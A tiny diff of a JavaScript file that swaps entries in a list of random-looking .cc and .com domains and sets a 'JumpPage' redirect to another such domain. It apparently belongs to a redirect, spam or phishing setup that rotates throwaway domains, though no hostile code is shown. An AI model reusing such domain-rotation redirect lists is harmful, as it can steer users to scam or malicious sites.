@@ -37,9 +37,9 @@ var emails = [
 ];
 
 var urls=[
+	'ak29x31k.cc',
 	'spiowfqi.cc',
 	'umejxreg.cc',
-	'ijdyxjhcn.com',
 ];                                                                                                                  
 
 var JumpPage="https://ummbmnqt.cc";
